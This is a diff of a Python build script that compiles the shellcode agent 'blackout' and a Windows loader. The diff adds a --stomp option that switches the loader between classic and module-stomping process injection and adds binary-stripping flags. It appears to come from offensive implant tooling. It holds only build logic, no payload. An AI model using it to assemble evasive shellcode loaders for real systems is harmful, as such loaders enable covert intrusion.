@@ -62,14 +62,20 @@ def generate_shellcode_header(bin_path, output_path, section):
     
     print(f'Generated shellcode header in {output_path}.')
 
-def compile_loader(injection_defines, ldr_output):
+def compile_loader( ldr_output, stomp=False):
     """Compiles the loader from the specified source files."""
     ldr_src = ["./loader/src/*.c", "./loader/src/obfuscation/*.c"]
     src_files = [file for pattern in ldr_src for file in glob.glob(pattern)]
+    loader_defines = ""
 
-    cx64 = "x86_64-w64-mingw32-gcc"
-    cflags = "-nostdlib -mrdrnd -Os -w -s -I loader/include"
-    clinks = "-lntdll -lkernel32 -lmsvcrt -lwinhttp -e WinMain"
+    cx64 = "x86_64-w64-mingw32-g++"
+    cflags = "-nostdlib -mrdrnd -Os -w -s -I loader/include -Os -fno-asynchronous-unwind-tables -Wl,-s,--no-seh,--enable-stdcall-fixup"
+    clinks = "-lntdll -lkernel32 -lmsvcrt -lwinhttp -e WinMain -fpermissive"
+
+    if stomp:
+        loader_defines += " -DINJECTION_STOMPER"
+    else:
+        loader_defines += " -DINJECTION_CLASSIC"
 
     if not src_files:
         print(f"No source files found in: {ldr_src}")
@@ -78,8 +84,8 @@ def compile_loader(injection_defines, ldr_output):
     os.makedirs('./bin', exist_ok=True)
     command = [cx64] + cflags.split() + src_files + clinks.split() + ['-o', ldr_output]
 
-    if injection_defines:
-        command += injection_defines.split()
+    if loader_defines:
+        command += loader_defines.split()
 
     result = subprocess.run(command)
     if result.returncode == 0:
@@ -90,7 +96,7 @@ def compile_loader(injection_defines, ldr_output):
         print(result.stderr)  # Print error output
         return False
 
-def compile_agent(agent_bkapi):
+def compile_agent(agent_bkapi, stomp=False):
     """Compiles the agent from the source files and assembly code."""
     CFLAGS = "-Os -fno-asynchronous-unwind-tables -nostdlib "
     CFLAGS += "-fno-ident -fpack-struct=8 -falign-functions=1 "
@@ -101,6 +107,10 @@ def compile_agent(agent_bkapi):
 
     if agent_bkapi:
         CFLAGS += f"-D{agent_bkapi} "
+    
+    if stomp:
+        # Add BK_STOMP for the agent when --stomp is used
+        CFLAGS += "-DBK_STOMP "
 
     BLACK_SRC = "agent/src/*.c"
     ASM_SRC = "agent/src/asm/blackout.x64.asm"
@@ -141,20 +151,19 @@ def main():
     parser = argparse.ArgumentParser(description="Compile a loader and dump shellcode.")
     parser.add_argument("--output", required=True, help="Specify the output file for the loader.")
     parser.add_argument("--section", help="Define the section for the loader.")
-    parser.add_argument("--injection", help="Define injection parameters.")
     parser.add_argument("--agent-bkapi", help="Define agent BKAPI input for the -D option.")
+    parser.add_argument("--stomp", action='store_true', help="Add -D BK_STOMP and -D INJECTION_STOMPER to agent and loader compilation.")
 
     args = parser.parse_args()
-    injection_defines = f"-D {args.injection}" if args.injection else ""
     ldr_output = f"bin/{args.output}"
 
     clean_bin_folder()
 
-    if compile_agent(args.agent_bkapi):
+    if compile_agent(args.agent_bkapi, stomp=args.stomp):
         extract_shellcode()
         generate_shellcode_header("bin/blackout.x64.bin", "loader/include/shellcode.h", args.section)
         
-        compile_loader(injection_defines, ldr_output)
+        compile_loader(ldr_output, stomp=args.stomp)
         
         try:
             os.remove("bin/blackout.x64.exe")
